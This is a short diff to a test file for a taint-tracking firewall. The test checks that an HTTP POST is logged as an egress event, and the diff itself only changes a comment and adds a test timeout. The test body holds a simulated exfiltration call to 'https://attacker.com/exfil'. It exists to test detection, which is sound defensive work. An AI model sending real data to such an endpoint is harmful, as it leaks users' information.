@@ -316,14 +316,14 @@ describe("PersistentTaintRegistry", () => {
 			try {
 				await secureExecute(fw, "http", "post", { url: "https://attacker.com/exfil" });
 			} catch {
-				// Expected
+				// Expected — network call may fail or time out
 			}
 
 			const events = fw.persistentTaintRegistry?.queryRecentEvents();
 			expect(events.some((e) => e.event_type === "egress")).toBe(true);
 
 			fw.close();
-		});
+		}, 15_000);
 
 		it("records persistent taint event when tainted input is processed", async () => {
 			const fw = createFirewall(makeOptions());
